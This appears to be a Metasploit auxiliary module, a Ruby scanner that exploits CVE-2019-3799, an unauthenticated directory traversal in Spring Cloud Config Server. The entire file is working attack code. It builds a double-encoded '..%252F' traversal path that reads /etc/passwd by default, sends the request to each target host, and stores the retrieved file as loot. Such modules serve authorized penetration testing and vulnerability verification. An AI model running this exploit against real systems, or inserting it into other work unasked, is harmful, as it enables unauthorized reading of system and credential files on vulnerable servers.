# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;        => &#039;Spring Cloud Config Server Directory Traversal&#039;,
      &#039;Description&#039; => %q{
        This module exploits an unauthenticated directory traversal
vulnerability
        which exists in Spring Cloud Config versions 2.1.x prior to 2.1.2,
        versions 2.0.x prior to 2.0.4, and versions 1.4.x prior to 1.4.6.
Spring
        Cloud Config listens by default on port 8888.
      },
      &#039;References&#039;  =>
        [
          [&#039;CVE&#039;, &#039;2019-3799&#039;],
          [&#039;URL&#039;, &#039;https://pivotal.io/security/cve-2019-3799&#039;]
        ],
      &#039;Author&#039;      =>
        [
          &#039;Vern&#039;, # Vulnerability discovery
          &#039;Dhiraj Mishra&#039; # Metasploit module
        ],
      &#039;DisclosureDate&#039; => &#039;2019-04-17&#039;,
      &#039;License&#039;        => MSF_LICENSE
    ))

    register_options(
      [
        Opt::RPORT(8888),
        OptString.new(&#039;FILEPATH&#039;, [true, "The path to the file to read",
&#039;/etc/passwd&#039;]),
        OptInt.new(&#039;DEPTH&#039;, [ true, &#039;Depth for Path Traversal&#039;, 13 ])
      ])
  end

  def data
    Rex::Text.rand_text_alpha(3..8)
  end

  def run_host(ip)
    filename = datastore[&#039;FILEPATH&#039;]
    traversal = "#{"..%252F" * datastore[&#039;DEPTH&#039;]}#{filename}"
    uri = "/#{data}/#{data}/master/#{traversal}"

    res = send_request_raw({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => uri
    })

    unless res && res.code == 200
      print_error(&#039;Nothing was downloaded&#039;)
      return
    end

    vprint_good("#{peer} - #{res.body}")
    path = store_loot(
      &#039;springcloud.traversal&#039;,
      &#039;text/plain&#039;,
      ip,
      res.body,
      filename
    )
    print_good("File saved in: #{path}")
  end
end

